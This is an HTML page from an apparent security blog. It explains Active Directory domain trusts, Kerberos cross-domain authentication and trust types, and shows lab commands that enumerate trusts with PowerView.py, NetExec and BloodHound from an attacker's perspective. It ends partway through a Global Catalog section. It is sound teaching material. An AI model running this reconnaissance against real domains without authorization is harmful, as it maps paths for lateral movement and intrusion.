@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Directory: Domain Trusts</title>
+    <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="/css/styles.css" rel="stylesheet">
+    <link href="/css/articles.css" rel="stylesheet">
+    <link href="/css/monokai.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <aside class="sidebar" id="sidebar">
+                <div class="sidebar-logo">
+                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
+                    <h3>elswix</h3>
+                </div>
+                <nav>
+                    <ul class="nav-menu">   
+                        <li class="nav-item">
+                            <a href="/" class="nav-link">
+                                <i>🏠</i>
+                                <span>Home</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/articles" class="nav-link active">
+                                <i>📝</i>
+                                <span>Articles</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/writeups" class="nav-link">
+                                <i>💻</i>
+                                <span>WriteUps</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/notes" class="nav-link">
+                                <i>📚</i>
+                                <span>Notes</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
+                                <i>⚡</i>
+                                <span>KL-Sunset</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/about" class="nav-link">
+                                <i>👤</i>
+                                <span>About me</span>
+                            </a>
+                        </li>
+                    </ul>
+                </nav>
+            </aside>
+
+            <!-- Main Content -->
+            <main>
+                <!-- Hero Section -->
+                <section class="hero mb-5">
+                    <img src="/img/articles/logo19.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <h2>Active Directory: Domain Trusts</h2>
+                    <p>Understanding Domain Trusts in Active Directory</p>
+                </section>
+
+                <section class="article-content">
+<div class="article-container">
+<div class="article-content-main">
+<h3>Introduction</h3><br/>
+<p>Today, we'll delve into the fundamentals of Domain Trusts and how misconfigurations can be leveraged to achieve domain escalation/lateral movement.</p><br/>
+<h3 class="note">Note</h3>
+<p>This article is based on and inspired by 
+  <a href="https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d" target="_blank" rel="noopener noreferrer">
+    the research published by harmj0y
+  </a>
+</p><br/>
+<h3>Understanding Domain Trust in Active Directory</h3><br/>
+<p>A <em>domain trust</em> is a security relationship established between two domains that allows users and resources in one domain to be authenticated and granted access to resources in another. Trusts form the foundation of collaboration across domains within the same forest or between separate forests.</p><br/>
+<p>Each trust defines how authentication requests are passed between domains and whether that relationship is one-way or two-way, transitive or non-transitive. By ma naging these trust relationships, administrators can control how identities and resources interact across organizational boundaries, balancing ease of access with security and administrative control.</p><br/>
+<h3>Understanding Domains and Forests in Active Directory</h3><br/>
+<p>In order to understand how Domain Trusts work, we first need to cover some basic concepts.</p><br/>
+<p>In Active Directory, a <strong>domain</strong> is the fundamental unit of organization and security. It’s essentially a logical grouping of users, computers, groups, and other objects that share a common directory database and security policies. Each domain has its own <strong>security boundary</strong> and is identified by a <strong>Domain Name System (DNS)</strong> name, such as <em>sales.company.com</em>. Within a domain, user authentication, authorization, and policy enforcement are centrally managed by domain controllers.</p><br/>
+<p>While a single domain can serve many organizations, larger environments often consist of multiple domains to separate administrative responsibilities, security policies, or geographical locations. To organize these domains, Active Directory uses a higher-level structure known as a <strong>forest</strong>.</p><br/>
+<p>A <strong>forest</strong> is the topmost container in the AD hierarchy, it’s a collection of one or more domains that share a <strong>common schema</strong>, <strong>global catalog</strong>, and <strong>trust relationships</strong>. The first domain created in a forest is called the <strong>forest root domain</strong>, and any additional domains added later automatically form <strong>two-way transitive trusts</strong> with it. This means that if Domain A trusts Domain B, and Domain B trusts Domain C, then Domain A automatically trusts Domain C, allowing users to access resources across the entire forest (subject to permissions).</p><br/>
+<p>In simpler terms, think of a <strong>domain</strong> as a single “neighborhood” with its own rules and residents, while a <strong>forest</strong> is the entire “city” that connects multiple neighborhoods under a shared infrastructure. Trusts are the agreements that let residents from one neighborhood visit or work in another safely.</p><br/>
+<h3 class="note">Note</h3><br/>
+<p>Before continuing with this article, you need to understand how Kerberos authentication works. You can read my article where I explain the <a href="/articles/13/kerberos-authentication.html" target="_blank">Kerberos authentication flow</a> in detail, step by step, it’s crucial for understanding this topic.</p><br/>
+<h3>Kerberos Authentication across Domains through Domain Trust</h3><br/>
+<p>Let’s say we have Domain A and Domain B in a two-way trust relationship, meaning each domain trusts the other. This setup allows users from Domain B to access resources in Domain A, and vice versa. Now, imagine a user from Domain A wants to access an SMB share in Domain B. What does the authentication process look like behind the scenes?</p><br/>
+<p>Initially, the user requests a <strong>TGT</strong> from the <strong>KDC</strong> through a <code>KRB_AS_REQ</code> message. If the provided credentials are valid, the KDC seamlessly returns the TGT to the user. Next, the user requests a <strong>Service Ticket (ST)</strong> from the KDC, specifying the <strong>SPN</strong> of the desired service, in this case, an SMB service in Domain B.</p><br/>
+<p>When the KDC receives the <code>KRB_TGS_REQ</code>, it inspects the provided SPN. Because the SPN belongs to a service in a different (but trusted) domain, instead of issuing a Service Ticket directly for that service, it returns a ticket addressed to the <strong>KRBTGT account</strong> of the other domain. This special ticket, often called an <strong>inter-realm TGT</strong> or <strong>referral ticket</strong>, is encrypted using a shared <strong>inter-realm trust key</strong> that was previously negotiated between the two domains when the trust relationship was created.</p><br/>
+<p>Next, the user presents this inter-realm TGT in a <code>KRB_TGS_REQ</code> request to the KDC of Domain B, specifying the SPN of the desired SMB service. The KDC in Domain B recognizes that the request originates from another domain and attempts to decrypt the ticket using the inter-realm trust key mentioned earlier. If decryption succeeds, the KDC issues a new Service Ticket encrypted with the target service’s key, this ticket can then be used to authenticate to the SMB service.</p><br/>
+<p>In simpler terms, the KDC in Domain B essentially says:</p><br/>
+<p><em>Well, the other domain has already authenticated this user and confirmed their identity and group memberships. Since I trust that domain, I’ll accept this information as valid.</em></p><br/>
+<p>As a result, a new Service Ticket is issued to the user, which can be used to authenticate to the requested service.</p><br/>
+<p><img alt="" src="/articles/19/img/AD-1.png"/></p><br/>
+<p>Here is a diagram summarizing the process:
+<img alt="" src="/articles/19/img/AD-2.png"/></p><br/>
+<p>This is the main concept of the Kerberos authentication flow that occurs behind the scenes when using Domain Trusts. Before continuing, there are some other concepts we need to understand.</p><br/>
+<h3>Direction of Trust and Transitivity</h3><br/>
+<p>Trust relationships in Active Directory define how domains authenticate and access resources across boundaries. These relationships can operate in one direction or in both.</p><br/>
+<p>A <strong>one-way trust</strong> creates a single, directional path for authentication between two domains. For example, if Domain A is trusted by Domain B, users in Domain A can access resources in Domain B, but not the other way around. Depending on the trust type, one-way trusts can be either transitive or nontransitive.</p><br/>
+<p>Within an Active Directory forest, all domain trusts are <strong>two-way and transitive</strong> by default. When a new child domain is added, Active Directory automatically builds a two-way, transitive trust between the parent and child domains. In a <strong>two-way trust</strong>, both domains trust each other, allowing authentication to flow in both directions. As with one-way trusts, some two-way relationships can be transitive or nontransitive depending on how the trust is configured.</p><br/>
+<p>Transitivity is another key characteristic of domain trusts. In simple terms, a <strong>transitive trust</strong> can be extended to other domains, while a <strong>nontransitive trust</strong> cannot. Because transitive trusts can be chained, users may gain access to resources across multiple domains. For example, if Domain A trusts Domain B, and Domain B trusts Domain C, then Domain A implicitly trusts Domain C.</p><br/>
+<p>Behind the scenes, when a trust is transitive, the trusting domain can repackage a user’s TGT into referral tickets and pass them along to the domains it trusts. This chaining mechanism is what allows authentication to flow smoothly across multiple trusted domains.</p><br/>
+<p>When enumerating trust relationships, especially one-way trusts, it's important to identify the direction of the trust. For example, if Domain A trusts Domain B, users from Domain B can access resources in Domain A, but not the other way around. This distinction matters during enumeration because, if you list trusts from Domain A, the relationship will appear as outbound (meaning users from Domain B can access resources in Domain A). Conversely, if you enumerate trusts from Domain B, it will be reported as inbound.</p><br/>
+<h3>Trust Types</h3><br/>
+<p>Although all Domain Trusts enable authenticated access to resources between domains, they can have different characteristics. It's important to understand the trust types implemented in the environment we are analyzing, as they have different security implications.</p><br/>
+<p><strong>Parent/Child Trusts</strong>, These exist within the same forest. When a new child domain is created, it automatically forms a two-way, transitive trust with its parent domain. This is the type of trust you’re most likely to run into in everyday Active Directory environments.</p><br/>
+<p><strong>Shortcut (Cross-link) Trusts</strong>, A shortcut trust is created manually between two child domains to speed up authentication referrals. Without it, referral requests may need to travel all the way up to the forest root and then back down to the target domain. In large or geographically distributed forests, shortcut trusts help reduce authentication latency by providing a more direct path.</p><br/>
+<p><strong>Tree-root Trusts</strong>, This is a two-way, transitive trust that automatically appears when you add a new domain tree to an existing forest. Although less common in typical deployments, they’re used when you want an additional tree inside the same forest that uses a separate DNS namespace rather than the child.parent.com model.</p><br/>
+<p><strong>External Trusts</strong>, These are explicit, non-transitive trusts formed between domains that belong to different forests or environments. They allow resource access between domains that aren’t connected by a forest trust. External trusts also enforce SID filtering, adding a layer of security by preventing SID history abuse (which we'll discuss later).</p><br/>
+<p><strong>Forest Trusts</strong>, A forest trust links two separate forests by creating a transitive trust between their forest root domains. Like external trusts, forest trusts enforce SID filtering. They’re often used in mergers, acquisitions, or cooperative scenarios where forests remain independent but need to share access.</p><br/>
+<p><strong>Realm Trusts</strong>, These are trusts established between an Active Directory domain and a non-Windows Kerberos realm that follows the RFC 4120 standard. They allow interoperability with UNIX/Linux or other Kerberos-based authentication systems.</p><br/>
+<h3>Previous to Enumeration</h3><br/>
+<p>Understanding domain trusts is essential from an offensive perspective because they often reveal pathways that defenders rarely pay close attention to. Many trusts were created years ago, inherited through mergers, or configured quickly to “make things work” which means they can introduce weak spots that no one has reviewed in a long time.</p><br/>
+<p>For an attacker, these relationships can expose opportunities to move from a lightly protected domain into one with higher-value targets, or to maintain presence by operating from a trusted but less-secure environment. They also expand the amount of information you can gather about the organization, giving you more angles to identify misconfigurations and potential privilege-escalation routes. Even when a trust doesn’t provide direct access, the visibility it grants across domain boundaries can still be leveraged to map the environment and plan your next steps.</p><br/>
+<h3>Enumeration</h3><br/>
+<p>Fortunately, there are now several tools that can enumerate and identify Domain Trusts in Active Directory environments. Some of them even provide visual mappings of these relationships, such as <a href="https://github.com/SpecterOps/BloodHound">BloodHound</a>, which makes it easier for us to understand the overall structure and highlight potential attack surfaces.</p><br/>
+<p>To start, I’ll focus on how to enumerate Domain Trusts remotely. You’re free to explore other tools for performing this enumeration locally, which I’ll cover in the next article on this topic as part of a practical scenario.</p><br/>
+<h3>PowerView.py</h3><br/>
+<p><a href="https://github.com/aniqfakhrul/powerview.py">PowerView.py</a> is a Python-based implementation of the well-known PowerView.ps1 script, offering Active Directory enumeration through the LDAP protocol. There are other tools that replicate the original PowerView.ps1 functionality, but this one is my preferred choice.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">powerview</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">elswix</span><span class="p">:</span><span class="n">Password2</span>\<span class="n">!</span><span class="n">@dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">Logging</span> <span class="n">directory</span> <span class="n">is</span> <span class="nb">set</span> <span class="n">to</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">powerview</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">elswix</span><span class="o">-</span><span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">╭─</span><span class="n">LDAP</span><span class="n">─</span><span class="p">[</span><span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">]</span><span class="n">─</span><span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">NS</span><span class="p">:</span><span class="o">&lt;</span><span class="n">auto</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="n">CACHED</span><span class="p">]</span>
+<span class="n">╰─</span><span class="n">PV</span> <span class="n">❯</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainTrust</span> <span class="o">-</span><span class="n">NoCache</span>
+</pre></div>
+<p>Once connected, let's enumerate Domain Trusts using the <code>Get-DomainTrust</code> command.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">╭─</span><span class="n">LDAP</span><span class="n">─</span><span class="p">[</span><span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">]</span><span class="n">─</span><span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">NS</span><span class="p">:</span><span class="o">&lt;</span><span class="n">auto</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="n">CACHED</span><span class="p">]</span>
+<span class="n">╰─</span><span class="n">PV</span> <span class="n">❯</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainTrust</span> <span class="o">-</span><span class="n">NoCache</span>
+<span class="n">objectClass</span>                   <span class="p">:</span> <span class="n">top</span>
+                                <span class="n">leaf</span>
+                                <span class="n">trustedDomain</span>
+<span class="n">whenCreated</span>                   <span class="p">:</span> <span class="mi">19</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">20</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">11</span> <span class="p">(</span><span class="mi">1</span> <span class="n">month</span><span class="p">,</span> <span class="mi">1</span> <span class="n">day</span> <span class="n">ago</span><span class="p">)</span>
+<span class="n">whenChanged</span>                   <span class="p">:</span> <span class="mi">20</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">01</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">20</span> <span class="p">(</span><span class="n">today</span><span class="p">)</span>
+<span class="n">name</span>                          <span class="p">:</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">objectGUID</span>                    <span class="p">:</span> <span class="p">{</span><span class="mi">4</span><span class="n">a300c81</span><span class="o">-</span><span class="n">b4a4</span><span class="o">-</span><span class="mi">4</span><span class="n">a88</span><span class="o">-</span><span class="n">b989</span><span class="o">-</span><span class="mi">4</span><span class="n">ff92ff49eb9</span><span class="p">}</span>
+<span class="n">securityIdentifier</span>            <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">119164063</span><span class="o">-</span><span class="mi">3581140015</span><span class="o">-</span><span class="mi">337040502</span>
+<span class="n">trustDirection</span>                <span class="p">:</span> <span class="n">INBOUND</span>
+                                <span class="n">OUTBOUND</span>
+                                <span class="n">BIDIRECTIONAL</span>
+<span class="n">trustPartner</span>                  <span class="p">:</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">trustType</span>                     <span class="p">:</span> <span class="n">WINDOWS_ACTIVE_DIRECTORY</span>
+                                <span class="n">MIT</span>
+<span class="n">trustAttributes</span>               <span class="p">:</span> <span class="n">WITHIN_FOREST</span>
+<span class="n">flatName</span>                      <span class="p">:</span> <span class="n">IT</span>
+</pre></div>
+<p>Since the command returned an output, we can confirm there’s a trust relationship in place. Now, let’s break down the results to understand what this trust looks like:</p><br/>
+<ul>
+<li>
+<p><strong>trustDirection:</strong> As the name suggests, this shows the direction of the trust. In this case, it lists both inbound and outbound, which means the trust is bidirectional. In other words, it’s a two-way relationship where users in both domains can access resources in each other.</p><br/>
+</li>
+<li>
+<p><strong>trustPartner:</strong> This identifies the domain on the other side of the trust.</p><br/>
+</li>
+<li>
+<p><strong>trustType:</strong> Here, the value is <em>WINDOWS_ACTIVE_DIRECTORY</em>, indicating that the trusted domain is a Windows-based AD domain.</p><br/>
+</li>
+<li>
+<p><strong>trustAttributes:</strong> This field provides additional details about the trust. In this example, <em>WITHIN_FOREST</em> tells us that the trusted domain is part of the same forest, which typically means a parent–child or cross-link trust.</p><br/>
+</li>
+</ul>
+<p>Now, let’s try authenticating to each domain using an account from the other:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">d</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">ITDC01</span>           <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">ITDC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> 
+<span class="n">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">ITDC01</span>           <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswix</span><span class="p">:</span><span class="n">Password2</span><span class="n">!</span> 
+<span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">u</span> <span class="n">ellie</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password3</span><span class="n">!</span> <span class="o">-</span><span class="n">d</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">SMB</span>         <span class="mf">192.168.100.1</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> 
+<span class="n">SMB</span>         <span class="mf">192.168.100.1</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">ellie</span><span class="p">:</span><span class="n">Password3</span><span class="n">!</span>
+</pre></div>
+<p>As shown, users from both domains can successfully access resources across the trust.</p><br/>
+<h3>Other Possible <strong>trustType</strong> Values</h3><br/>
+<p>Besides <em>WINDOWS_ACTIVE_DIRECTORY</em>, you may encounter other trust types depending on the environment:</p><br/>
+<ul>
+<li>
+<p><strong>DOWNLEVEL:</strong> Indicates a Windows domain that does <strong>not</strong> run Active Directory. Some tools label this as <em>WINDOWS_NON_ACTIVE_DIRECTORY</em> to make it clearer.</p><br/>
+</li>
+<li>
+<p><strong>UPLEVEL:</strong> Refers to a Windows domain that <strong>does</strong> use Active Directory. This is the most common value you'll find in modern environments, and PowerView reports it as <em>WINDOWS_ACTIVE_DIRECTORY</em>.</p><br/>
+</li>
+<li>
+<p><strong>MIT:</strong> Used when the trusted domain is running a non-Windows Kerberos implementation (usually Unix/Linux) that follows the RFC4120 standard. It’s called <em>MIT</em> because MIT originally defined that specification.</p><br/>
+</li>
+</ul>
+<h3>Other Possible <strong>trustAttributes</strong> Values</h3><br/>
+<p>The <em>trustAttributes</em> field can reveal additional details about how the trust behaves. These are some other values you might see:</p><br/>
+<ul>
+<li>
+<p><strong>NON_TRANSITIVE:</strong> The trust doesn’t extend beyond the two domains involved. Trusts like this don’t “chain” across other domains, and external trusts usually fall into this category.</p><br/>
+</li>
+<li>
+<p><strong>UPLEVEL_ONLY:</strong> Only Windows 2000 and newer systems can use the trust.</p><br/>
+</li>
+<li>
+<p><strong>QUARANTINED_DOMAIN:</strong> Indicates that SID filtering is enabled, limiting which security identifiers are accepted from the trusted domain.</p><br/>
+</li>
+<li>
+<p><strong>FOREST_TRANSITIVE:</strong> Shows that the trust is a cross-forest relationship between two forest roots running at least Windows Server 2003 functional level.</p><br/>
+</li>
+<li>
+<p><strong>CROSS_ORGANIZATION:</strong> Means the trust is with a domain/forest outside the organization, often tied to selective authentication scenarios.</p><br/>
+</li>
+<li>
+<p><strong>WITHIN_FOREST:</strong> The trusted domain belongs to the same forest—commonly seen in parent–child or cross-link relationships.</p><br/>
+</li>
+<li>
+<p><strong>TREAT_AS_EXTERNAL:</strong> Even though the trust is cross-forest, it should be handled like an external trust for SID filtering purposes. The security implications of this can vary depending on the configuration.</p><br/>
+</li>
+<li>
+<p><strong>USES_RC4_ENCRYPTION:</strong> In MIT-type trusts, this shows that RC4 keys are supported.</p><br/>
+</li>
+<li>
+<p><strong>USES_AES_KEYS:</strong> Indicates that AES keys are used for encrypting Kerberos tickets, though this attribute isn’t always documented officially.</p><br/>
+</li>
+<li>
+<p><strong>CROSS_ORGANIZATION_NO_TGT_DELEGATION:</strong> Tickets obtained through this trust cannot be used for delegation.</p><br/>
+</li>
+<li>
+<p><strong>PIM_TRUST:</strong> Marks the trust as a Privileged Identity Management trust when combined with the “treat as external” flag. This is seen only in newer domain functional levels and isn’t very common in real-world environments.</p><br/>
+</li>
+</ul>
+<h3>BloodHound</h3><br/>
+<p>BloodHound also allows you to enumerate Domain Trusts through the <strong>"Trusts"</strong> <code>CollectionMethod</code>. However, in this case I’ll run the enumeration using all available collection methods:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="nb">all</span> <span class="o">-</span><span class="n">u</span> <span class="n">ellie</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password3</span><span class="n">!</span> <span class="o">-</span><span class="n">dc</span> <span class="n">itdc01</span><span class="o">.</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">--</span><span class="nb">zip</span> <span class="o">-</span><span class="n">d</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">ns</span> <span class="mf">192.168.100.3</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">BloodHound</span><span class="o">.</span><span class="n">py</span> <span class="n">for</span> <span class="n">BloodHound</span> <span class="n">LEGACY</span> <span class="p">(</span><span class="n">BloodHound</span> <span class="mf">4.2</span> <span class="n">and</span> <span class="mf">4.3</span><span class="p">)</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="n">AD</span> <span class="n">domain</span><span class="p">:</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">WARNING</span><span class="p">:</span> <span class="n">Could</span> <span class="n">not</span> <span class="n">find</span> <span class="n">a</span> <span class="n">global</span> <span class="n">catalog</span> <span class="n">server</span><span class="p">,</span> <span class="n">assuming</span> <span class="n">the</span> <span class="n">primary</span> <span class="n">DC</span> <span class="n">has</span> <span class="n">this</span> <span class="n">role</span>
+<span class="n">If</span> <span class="n">this</span> <span class="n">gives</span> <span class="n">errors</span><span class="p">,</span> <span class="n">either</span> <span class="n">specify</span> <span class="n">a</span> <span class="n">hostname</span> <span class="n">with</span> <span class="o">-</span><span class="n">gc</span> <span class="n">or</span> <span class="n">disable</span> <span class="n">gc</span> <span class="n">resolution</span> <span class="n">with</span> <span class="o">--</span><span class="n">disable</span><span class="o">-</span><span class="n">autogc</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="n">for</span> <span class="n">user</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">itdc01</span><span class="o">.</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">domains</span> <span class="n">in</span> <span class="n">the</span> <span class="n">forest</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">computers</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">itdc01</span><span class="o">.</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">GC</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">itdc01</span><span class="o">.</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">5</span> <span class="n">users</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">49</span> <span class="n">groups</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">gpos</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">ous</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">19</span> <span class="n">containers</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">trusts</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Starting</span> <span class="n">computer</span> <span class="n">enumeration</span> <span class="n">with</span> <span class="mi">10</span> <span class="n">workers</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">ITDC01</span><span class="o">.</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Done</span> <span class="n">in</span> <span class="mi">00</span><span class="n">M</span> <span class="mi">01</span><span class="n">S</span>
+<span class="n">INFO</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">output</span> <span class="n">into</span> <span class="mi">20251121001247</span><span class="n">_bloodhound</span><span class="o">.</span><span class="n">zip</span>
+</pre></div>
+<p>Once the process completes, import the resulting ZIP file into BloodHound. After that, click on <strong>"Map Domain Trusts"</strong>:</p><br/>
+<p><img alt="" src="/articles/19/img/AD-3.png"/></p><br/>
+<p>As shown in the graph, BloodHound identified two trust relationships. One of them is the two-way trust we already saw earlier, represented by arrows (the <em>TrustedBy</em> edge) pointing in both directions. The other is a new trust that didn’t appear before: a one-way trust with another domain, where <code>hackencycorp.local</code> is the trusted domain (meaning users from that domain can authenticate to the other). This additional domain didn’t show up earlier because the PowerView enumeration was performed from <strong>elswixcorp.local</strong>, while BloodHound was executed on <strong>it.elswixcorp.local</strong>, which is the one holding the one-way trust. This new domain belongs to a different forest, which means the relationship is an external trust.</p><br/>
+<h3>Global Catalog</h3><br/>
+<p>There’s a way to enumerate all Domain Trust relationships that each domain has within a forest, whether internal or external. This can be accomplished through the Global Catalog.</p><br/>
+<p>The Global Catalog is a distributed data repository in Active Directory that stores a searchable, partial replica of all objects from every domain in the forest. Its main purpose is to let users and services quickly find directory information without needing to query each domain individually. It also plays a key role in logon processes and forest-wide searches.</p><br/>
+<p>Fortunately, trust relationships are replicated in the Global Catalog, which makes Domain Trust mapping much easier, you only need to query the GC instead of every individual domain. You can query it using various LDAP tools, such as PowerView:</p><br/>
